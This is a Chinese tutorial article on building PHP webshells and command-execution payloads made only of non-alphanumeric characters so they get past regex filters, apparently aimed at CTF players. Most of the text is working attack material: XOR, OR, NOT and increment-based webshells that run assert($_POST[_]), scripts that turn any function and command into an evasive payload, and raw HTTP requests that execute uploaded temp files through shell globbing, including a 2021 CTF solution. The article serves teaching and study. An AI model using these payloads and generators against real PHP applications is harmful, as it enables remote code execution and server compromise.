> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Gb9SW0Sl63xbQ21pSY_JOg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7HCO7RaQ2gHesSKU34IL6NCF09WkhicoFhYDxFRgHhOmDLAoSgnJsibnzg/640?wx_fmt=jpeg)

前言
--

无字母数字 Webshell 是个老生常谈的东西了，之前打 CTF 的时候也经常会遇到，每次都让我头大。由于一直没有去系统的研究过这个东西，今天就好好学习学习。

所谓无字母数字 Webshell，其基本原型就是对以下代码的绕过：

```
<?php
if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
eval($_GET['shell']);
}
```

这段代码限制了我们传入 shell 参数中的值不能存在字母和数字。

下面我们来说说答题的思路：

首先，代码确实是限制了我们的 Webshell 不能出现任何字母和数字，但是并没有限制除了字母和数字以外的其他字符。所以我们的思路是，将非字母数字的字符经过各种转换，最后能构造出`a-z0-9`中的任意一个字符。然后再利用 PHP 允许动态函数执行的特点，拼接处一个函数名，比如 “assert”、”system”、”file_put_contents”、”call_user_func” 等危险函数然后动态执行即可。

说道 PHP 代码动态执行我们要注意的是，在 PHP 5 中 assert() 是一个函数，我们可以通过`$f='assert';$f(...);`这样的方法来动态执行任意代码，此时它可以起到替代 eval() 的作用。但是在 PHP 7 中，assert() 不再是函数了，而是变成了一个和 eval() 一样的语言结构，此时便和 eval() 一样不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用 file_put_contents() 函数，同样可以用来 Getshell 。

基础知识
----

### PHP 短标签

我们最常见的 PHP 标签就是`<?php ?>`了，但是 PHP 中还有两种短标签，即`<? ?>`和`<?= ?>`。当关键字 “php” 被过滤了之后，此时我们便不能使用`<?php ?>`了，但是我们可以用另外两种短标签进行绕过，并且在短标签中的代码不需要使用分号`;`。

其中，`<? ?>`相当于对`<?php ?>`的替换。而`<?= ?>`则是相当于`<?php echo ... ?>`。例如：

```
<?='Hello World'?>    // 输出 "Hello World"
```

### PHP 中的反引号

PHP 中，反引号可以直接命令执行系统命令，但是如果想要输出执行结果还需要使用 echo 等函数：

```
<?php echo `ls /`;?>
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7HXMlmzGZ5nobcnq3613aAk2WRCCKTotlujlyuLeeKwwN2eDZTKgJuQQ/640?wx_fmt=jpeg)

还可以使用`<?= ?>`短标签（比较灵活）：

```
<?= `ls /`?>
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7Hg1dzNUS7kicjfM2aE8J4ewm3oYWexusPZoicAgVz8FM9T2dUVW7EzKVg/640?wx_fmt=jpeg)

### 通配符在 RCE 中的利用

先说一下原理：

> 在正则表达式中，`?`这样的通配符与其它字符一起组合成表达式，匹配前面的字符或表达式零次或一次。
> 
> 在 Shell 命令行中，`?`这样的通配符与其它字符一起组合成表达式，匹配任意一个字符。
> 
> 同理，我们可以知道`*`通配符：
> 
> 在正则表达式中，`*`这样的通配符与其它字符一起组合成表达式，匹配前面的字符或表达式零次或多次。
> 
> 在 shell 命令行中，`*`这样的通配符与其它字符一起组合成表达式，匹配任意长度的字符串。这个字符串的长度可以是 0，可以是 1，可以是任意数字。

所以，我们利用`?`和`*`在正则表达式和 Shell 命令行中的区别，可以绕过关键字过滤，如下实例：

```
假设flag在/flag中:
cat /fla?
cat /fla*

假设flag在/flag.txt中:
cat /fla????
cat /fla*

假设flag在/flags/flag.txt中:
cat /fla??/fla????
cat /fla*/fla*

假设flag在flagg文件加里:
cat /?????/fla?
cat /?????/fla*
```

我们可以用以上格式的 Payload 都可以读取到 flag。

### PHP 5 和 PHP 7 的区别

（1）在 PHP 5 中，`assert()`是一个函数，我们可以用`$_=assert;$_()`这样的形式来实现代码的动态执行。但是在 PHP 7 中，`assert()`变成了一个和`eval()`一样的语言结构，不再支持上面那种调用方法。（但是好像在 PHP 7.0.12 下还能这样调用）

（2）PHP5 中，是不支持`($a)()`这种调用方法的，但在 PHP 7 中支持这种调用方法，因此支持这么写`('phpinfo')();`

异或运算绕过
------

### 绕过原理

在 PHP 中两个字符串异或之后，得到的还是一个字符串。如果正则匹配过滤了字母和数字，那就可以使用两个不在正则匹配范围内的非字母非数字的字符进行异或，从而得到我们想要的字符串。

例如，我们异或`?`和`~`之后得到的是`A`：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7HibiaAiakPXwE9Zd5aN3S5liajBNPjOEiaMWfNL8cKpYSlTq5m8P8icRdZmxA/640?wx_fmt=jpeg)

基于此原理我们可以构造出无字母数字的 Webshell，下面是 PHITHON 师傅的一个 Payload：

```
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);
```

看到代码中的下划线`_`、`__`、`___`是一个变量，因为 preg_match() 过滤了所有的字母，我们只能用下划线来作变量名。最后拼接起来 Payload 如下：

```
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);

// 密码为 "_"
```

测试效果如下：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7HiaaPS5fSeD6YMETOMJTGwEBT7vgcTEsGMEOJuQtRpsS7VFDWrDic9vOQ/640?wx_fmt=jpeg)

### 构造脚本

下面给出一个异或绕过的脚本：

```
<?php

$myfile = fopen("xor_rce.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
for ($j=0; $j <256 ; $j++) { 

if($i<16){
$hex_i='0'.dechex($i);
}
else{
$hex_i=dechex($i);
}
if($j<16){
$hex_j='0'.dechex($j);
}
else{
$hex_j=dechex($j);
}
$preg = '/[a-z0-9]/i';    // 根据题目给的正则表达式修改即可
if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
echo "";
}

else{
$a='%'.$hex_i;
$b='%'.$hex_j;
$c=(urldecode($a)^urldecode($b));
if (ord($c)>=32&ord($c)<=126) {
$contents=$contents.$c." ".$a." ".$b."\n";
}
}

}
}
fwrite($myfile,$contents);
fclose($myfile);
```

首先运行以上 PHP 脚本后，会生成一个 txt 文档 xor_rce.txt，里面包含所有可见字符的异或构造结果。

接着运行以下 Python 脚本，输入你想要构造的函数名和要执行的命令即可生成最终的 Payload：

```
# -*- coding: utf-8 -*-

def action(arg):
s1=""
s2=""
for i in arg:
f=open("xor_rce.txt","r")
while True:
t=f.readline()
if t=="":
break
if t[0]==i:
#print(i)
s1+=t[2:5]
s2+=t[6:9]
break
f.close()
output="(\""+s1+"\"^\""+s2+"\")"
return(output)

while True:
param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
print(param)
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7H4H4qlkhpBdbRIRlIuJbpoyOcBTSml4ML8Np6JNFib7jxcngiavjCqiaiaA/640?wx_fmt=jpeg)

```
[+] your function：system
[+] your command：ls /
("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")("%0c%08%00%00"^"%60%7b%20%2f");
```

测试效果如下：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7Hz1HcOFPVx8W9LthDr6y5pWib7pslX8zkKWRJWOZtKHUUrBggqZqwibxA/640?wx_fmt=jpeg)

或运算绕过
-----

### 绕过原理

在前面异或绕过中我们说了，PHP 中两个字符串异或之后得到的还是一个字符串。那么或运算原理也是一样，如果正则匹配过滤了字母和数字，那就可以使用两个不在正则匹配范围内的非字母非数字的字符进行或运算，从而得到我们想要的字符串。

### 构造脚本

下面给出一个或运算绕过的脚本：

```
<?php

$myfile = fopen("or_rce.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
for ($j=0; $j <256 ; $j++) { 

if($i<16){
$hex_i='0'.dechex($i);
}
else{
$hex_i=dechex($i);
}
if($j<16){
$hex_j='0'.dechex($j);
}
else{
$hex_j=dechex($j);
}
$preg = '/[0-9a-z]/i';    // 根据题目给的正则表达式修改即可
if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
echo "";
}

else{
$a='%'.$hex_i;
$b='%'.$hex_j;
$c=(urldecode($a)|urldecode($b));
if (ord($c)>=32&ord($c)<=126) {
$contents=$contents.$c." ".$a." ".$b."\n";
}
}

}
}
fwrite($myfile,$contents);
fclose($myfile);
```

首先运行以上 PHP 脚本后，会生成一个 txt 文档 or_rce.txt，里面包含所有可见字符的或运算构造结果。

接着运行以下 Python 脚本，输入你想要构造的函数名和要执行的命令即可生成最终的 Payload：

```
# -*- coding: utf-8 -*-

def action(arg):
s1=""
s2=""
for i in arg:
f=open("or_rce.txt","r")
while True:
t=f.readline()
if t=="":
break
if t[0]==i:
#print(i)
s1+=t[2:5]
s2+=t[6:9]
break
f.close()
output="(\""+s1+"\"|\""+s2+"\")"
return(output)

while True:
param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
print(param)
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7HmvdpuwRLOlL8VVJYWzicCY9slsJFJIFY4PuPFYibUF8fRmJGenJo1iaMw/640?wx_fmt=jpeg)

```
[+] your function：system
[+] your command：ls /
("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%0c%13%00%00"|"%60%60%20%2f");
```

测试效果如下：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7HQ6VcvkoLpcjzbWmlJkBKW8ZEwQ5SdFLLT3svPiaP5v6f8tIl9PKkjuw/640?wx_fmt=jpeg)

取反运算绕过
------

### 绕过原理

该方法和前面那两种绕过的方法有异曲同工之妙，唯一差异就是，这里使用的是位运算里的 “取反” 运算。

先来看看 PHITHON 师傅的汉字取反绕过，利用的是 UTF-8 编码的某个汉字，将其中某个字符取出来，比如`'和'{2}`的结果是`"\x8c"`，其再取反即可得到字母`s`：

```
echo ~('瞰'{1});    // a
echo ~('和'{2});    // s
echo ~('和'{2});    // s
echo ~('的'{1});    // e
echo ~('半'{1});    // r
echo ~('始'{2});    // t
```

这里直接给出 PHITHON 师傅的 Webshell：

```
$__=('>'>'<')+('>'>'<');    // $__=2, 利用PHP的弱类型的特点获取数字
$_=$__/$__;    // $_=1

$____='';$___="瞰";$____.=~($___{$_});$___="和";$____.=~($___{$__});$___="和";$____.=~($___{$__});$___="的";$____.=~($___{$_});$___="半";$____.=~($___{$_});$___="始";$____.=~($___{$__}); // $____=assert

$_____=_;$___="俯";$_____.=~($___{$__});$___="瞰";$_____.=~($___{$__});$___="次";$_____.=~($___{$_});$___="站";$_____.=~($___{$_});  // $_____=_POST

$_=$$_____;  // $_=$_POST
$____($_[$__]);  // assert($_POST[2])
```

缩减后即：

```
$__=('>'>'<')+('>'>'<');$_=$__/$__;$____='';$___="瞰";$____.=~($___{$_});$___="和";$____.=~($___{$__});$___="和";$____.=~($___{$__});$___="的";$____.=~($___{$_});$___="半";$____.=~($___{$_});$___="始";$____.=~($___{$__});$_____=_;$___="俯";$_____.=~($___{$__});$___="瞰";$_____.=~($___{$__});$___="次";$_____.=~($___{$_});$___="站";$_____.=~($___{$_});$_=$$_____;$____($_[$__]);
或:
$__=('>'>'<')+('>'>'<');$_=$__/$__;$____='';$___=瞰;$____.=~($___{$_});$___=和;$____.=~($___{$__});$___=和;$____.=~($___{$__});$___=的;$____.=~($___{$_});$___=半;$____.=~($___{$_});$___=始;$____.=~($___{$__});$_____=_;$___=俯;$_____.=~($___{$__});$___=瞰;$_____.=~($___{$__});$___=次;$_____.=~($___{$_});$___=站;$_____.=~($___{$_});$_=$$_____;$____($_[$__]);
```

**注意：**执行的时候要进行一次 URL 编码，否则 Payload 无法执行。

测试效果如下：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7HAIdrvYLvrH5AOfFibqHAA4kIgib18JwcO0OztTRVocibiazHoyeYchE2oA/640?wx_fmt=jpeg)

### URL 编码取反绕过

刚才我们介绍的是通过取反汉字来得到我们想要的字母，我们还可以直接对一串恶意代码进行取反然后 URL 编码，在发送 Payload 的时候再次将其取反便可将代码还原，然后将其动态执行。并且，因为是取反，基本上用的都是不可见字符，所以不会触发到正则表达式。

假设我们要构造一个`phpinfo();`，由于因为没有过滤括号，所以只需要先取反再编码字符串 “phpinfo” 就行了：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7HalNyj4KzHczU3ic9GYNvwZgOJuUOCcmqKwSrHwev99yib949UBR2vDtQ/640?wx_fmt=jpeg)

然后构造出我们的 Payload：

```
(~%8F%97%8F%96%91%99%90)();    // phpinfo();
```

测试效果如下：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7HzekC9g6Avc7mF4qmywRJQ8mfficobEd0A6iaViafDlYe4ujriax6B38j0w/640?wx_fmt=jpeg)

`phpinfo()`是没有参数的，如果需要执行有参数的函数的话，比如`system('whoami');`，则应分别对其中的字符进行编码：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7HKjRGqVWE5ZnYOG0A4QOny9BJXoWNZ9BzKXu4oLWFjR1C25d6JeLw0w/640?wx_fmt=jpeg)

然后构造出我们的 Payload：

```
(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);    // system('ls /');
```

测试效果如下：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7HazKnk9ibTHmRJUUyiafGHYTPWSNnpv4hGzu1XcibHmKRtATdXlrGIqNxw/640?wx_fmt=jpeg)

### 构造脚本

直接运行以下脚本并输入提示内容即可生成 Payload：

```
<?php
//在命令行中运行

fwrite(STDOUT,'[+]your function: ');

$system=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 

fwrite(STDOUT,'[+]your command: ');

$command=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 

echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7Hy5kwJNbuOkjNBEhzTPqCfFl2QnTbHjNmkbNZVVtKrXdMkpLibEW34qg/640?wx_fmt=jpeg)

```
[+]your function: system
[+]your command: ls /
[*] (~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);
```

自增绕过
----

### 绕过原理

首先我们来看一看 PHP 中自增自减的一个特性：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7HgaOCWgRictxC6z5W0CspqeUXYOkqTqLduLE083CJLAk9avkajE9ExWg/640?wx_fmt=jpeg)

也就是说：

```
"A"++ ==> "B"
"B"++ ==> "C"
......
```

所以，只要我们能拿到一个变量，其值为`a`，那么通过自增操作即可获得`a-z`中所有字符。

那么，如何拿到一个值为字符串’a’的变量呢？我们发现，在 PHP 中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为`Array`：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7HYfh83UR5BaCZagXEGHaicUBgtMwBpeMNu7IrefexevMOq92DDZVnicJQ/640?wx_fmt=jpeg)

而`Array`的第一个字母就是大写 A，而且第 4 个字母是小写 a。也就是说我们可以同时拿到小写 a 和大写 A，那么我们就可以拿到`a-z`和`A-Z`的所有字母：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7HVXzred8cDouH58cZ78kbVQS9wL46SWT0ZzPU38CkptP2fF1J7wrBicQ/640?wx_fmt=jpeg)

下面给出 PHITHON 师傅编写的 Webshell：

```
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```

缩减后即：

```
$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
```

**注意：**执行的时候要进行一次 URL 编码，否则 Payload 无法执行。

测试效果如下：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7HwGfBmdKKjXIQCLvLFajXnlcARCB1EumwBF6K3QbVVL66hMrpKCnhRw/640?wx_fmt=jpeg)

脑洞大开
----

看完上面的几种绕过姿势后，你也许对无字母数字 Webshell 的构造思路有了一定的了解，下面所讲的几种骚姿势会更加让你脑洞大开。

### 绕过`_`下划线

在前文中我们可以看到，很多 Payload 的构造都用到了下划线`_`作为变量名。但即便是下划线`_`被过滤了，我们也根本无需担心，因为我们本就可以不用`_`。

比如我们前面的像下面那几种 Payload 就没有用到_：

```
("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")("%0c%08%00%00"^"%60%7b%20%2f");
("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%0c%13%00%00"|"%60%60%20%2f");
(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);
```

再来看看另一个师傅用过这样的 Payload，也可以绕过，而且效果极好：

```
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
```

解释一下这个师傅的绕过手法：

```
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
即: 
${_GET}{%ff}();&%ff=phpinfo
//?shell=${_GET}{%ff}();&%ff=phpinfo
```

> 任何字符与 0xff 异或都会取相反，这样就能减少运算量了。注意：测试中发现，传值时对于要计算的部分不能用括号括起来，因为括号也将被识别为传入的字符串，可以使用`{}`代替，原因是 PHP 的 use of undefined constant 特性。例如`${_GET}{a}`这样的语句 PHP 是不会判为错误的，因为`{}`是用来界定变量的，这句话就是会将`_GET`自动看为字符串，也就是`$_GET['a']`。`${_GET}{%ff}`后面那个`()`为的是能够动态执行传入的 PHP 函数。

如果想要执行代函数的函数比如`system('whoami')`，那我们可以对后面括号里的参数做相同的编码处理：

```
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(%ff%ff%ff%ff%ff%ff^%88%97%90%9E%92%96);&%ff=system
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(%ff%ff%ff%ff%ff%ff%ff%ff^%99%93%9E%98%D1%8F%97%8F);&%ff=readfile
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(%ff%ff%ff%ff%ff%ff%ff%ff^%99%93%9E%98%D1%8F%97%8F);&%ff=highlight_file

// 即: 
// ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}('whoami');&%ff=system
// ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}('flag.php');&%ff=readfile
// ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}('flag.php');&%ff=highlight_file
```

同理，我们也可以直接进行取反：

```
${~%A0%B8%BA%AB}{%ff}();&%ff=phpinfo
${~%A0%B8%BA%AB}{%ff}(~%88%97%90%9E%92%96);&%ff=system
```

测试效果如下：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7HOCfNIITeqHwLdH4TjAmxPL06sWHiasggibeibRqWib58Fc0UM0UVDyI1dQ/640?wx_fmt=jpeg)

**此外，继承于上述原理，我们还可以直接使用反引号执行命令：**

```
?><?=`{${~%A0%B8%BA%AB}{%ff}}`?>&%ff=ls /
```

分析下这个 Payload：

```
?><?=`{${~%A0%B8%BA%AB}{%ff}}`?>&%ff=ls /
即: 
?><?=`$_GET[%ff]`?>&%ff=ls /
```

最开头的`?>`闭合了 eval() 函数自带的`<?`标签。接下来使用了短标签代替`<?php echo ... ?>`。`{}`里面包含的 PHP 代码可以被执行，`~%A0%B8%BA%AB`为`_GET`，最后将通过参数`%ff`传入的值使用反引号进行命令执行。

测试效果如下：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7HT6iboeC0UkNhFTnqibEPBTGAicjQzazOUTSIgjvhAuWoPIUpOwzfkSkkA/640?wx_fmt=jpeg)

### 过滤了分号`;`

无需担心，前面我们已经说了，PHP 短标签中的代码不需要写分号，所以我们直接把所有的 PHP 语句改成短标签形式就行了。

### 过滤了`$`

如果过滤了`$`，那么像之前那些构造变量的方法全都不能用了。我们可以在不同版本的 PHP 环境中寻找突破。

#### PHP 7

在 PHP 7 中修改了表达式执行的顺序：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7HnhPFRQND4MeoiaCEQ5iamwibkdOmf0fv2htnX4klxiaHrFTKMMAWWTiaqKw/640?wx_fmt=jpeg)

PHP 7 前是不允许用`($a)();`这样的方法来执行动态函数的，但 PHP 7 中增加了对此的支持。所以，我们可以通过`('phpinfo')();`的形式来执行函数，第一个括号中可以是任意 PHP 7 表达式。

所以很简单了，构造一个类似`('phpinfo')();`这样的 PHP 表达式即可，前面我们也已经涉及到了：

```
("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")("%0c%08%00%00"^"%60%7b%20%2f");
("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%0c%13%00%00"|"%60%60%20%2f");
(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);
```

#### PHP 5

在 PHP 5 中如果我们还使用`('phpinfo')();`这样的 PHP 表达式则会得到一个报错，原因就是 PHP 5 并不支持这种表达方式。所以，如果也过滤了`$`的话，对于 PHP 5 环境的利用方法就很复杂了。

此时我想到了两个有趣的 Linux Shell 知识点：

> Linux Shell 下可以利用`.`来执行任意脚本
> 
> Linux 文件名支持用 Glob 通配符进行代替

在 Linux Shell 中`.`的作用和`source`一样，就是在当前 Bash 环境下读取并执行一个文件中的命令。比如，当前运行的 Shell 是 Bash，则`. file`的意思就是用当前 Bash 执行 file 文件中的命令。并且用`. file`执行文件，是不需要 file 文件有 x 权限的。

那么，如果目标服务器上有一个我们可控的文件，那我们不就可以利用`.`来执行它了吗？这个文件也很好得到，我们可以发送一个上传文件的 POST 包，此时 PHP 会将我们上传的临时文件保存在临时文件夹下，默认的文件名是`/tmp/phpXXXXXX`，文件名最后 6 个字符是随机的大小写字母。（其实这个知识点在 CTF 中也频繁出镜，比如文件包含中的利用等）

第二个难题接踵而至，临时文件`. /tmp/phpXXXXXX`的命名是随机的，那我们该如何去找到他名执行呢？此时就可以用到 Linux 下的 Glob 通配符：

> `*`：可以匹配 0 个及以上任意字符
> 
> `?`：可以匹配 1 个任意字符

那么，`/tmp/phpXXXXXX`就可以表示为`/*/?????????`或`/???/?????????`了。但是在真正操作起来的时候我们会发现这样通常并不能成功的执行文件，而是会报错，原因就是这样匹配到的文件太多了，系统不知道要执行哪个文件。如果没有限制字母的话我们完全可以使用`/???/php??????`来提高匹配几率，但是题目限制的就是字母数字，所以我们的想别的办法。

根据 PHITHON 师傅的文章，最后我们可以采用的 Payload 是：

```
. /???/????????[@-[]
```

最后的`[@-[]`表示 ASCII 在`@`和`[`之间的字符，也就是大写字母，所以最后会执行的文件是 /tmp 文件夹下结尾是大写字母的文件。这是因为匹配到的所有的干扰文件的文件名都是小写，唯独 PHP 生成的临时文件最后一位是随机的大小写字母。

最后给出一个 Payload：

```
POST /?shell=?><?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?> HTTP/1.1
Host: 192.168.43.210:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type:multipart/form-data;boundary=--------123
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 109

----------123
Content-Disposition:form-data;

#!/bin/sh
ls /
----------123--
```

测试效果如下：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7HibYW4nPYH5Qdye41G3PQqFUpiciaGKic8oD7FcUmuO4KxaMicZibzwYVe2vw/640?wx_fmt=jpeg)

我们可能需要多试几次才能正确的执行我们的代码，50% 的几率。下面我们来看一道 CTF 例题。

#### [2021 津门杯 CTF]hate_php

题目源码：

```
<?php
error_reporting(0);
if(!isset($_GET['code'])){
highlight_file(__FILE__);
}else{
$code = $_GET['code'];
if(preg_match("/[A-Za-z0-9_$@]+/",$code)){
die('fighting!'); 
}
eval($code);
}
```

需要构造无字母数字的 Webshell，但是过滤了`_`和`$`就比较麻烦了，并且由于题目时 PHP 5 的环境：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7HGiaEOhI5ib32F6jl4NOLssVYuibRIDa92ZDCibDMoGP05jAZyTGFYDEiblw/640?wx_fmt=jpeg)

其不允许像 PHP 7 中通过`('phpinfo')();`的形式来动态执行函数。但是我们可以通过执行临时文件的方法来绕过。给出 Payload：

```
POST /?code=?><?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%3f-[]`%3b?> HTTP/1.1
Host: 122.112.214.101:20004
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type:multipart/form-data;boundary=--------123
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 114

----------123
Content-Disposition:form-data;

#!/bin/sh
cat /flag
----------123--
```

本来应该是：

```
?><?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?>
```

但是由于题目过滤了`@`，那么我们可以取`@`之前的一个字符，也就是`?`，即`%3f`：

```
?><?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%3f-[]`%3b?>
```

最终得到 flag：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icyRibA1ohv9ctAtHdmFBe7HhNpGqdAev92kgR5OIh0HyfhMMAMzibAG2RG9CC5kJm3Dt7vWyMYonGA/640?wx_fmt=jpeg)

参考：

https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html

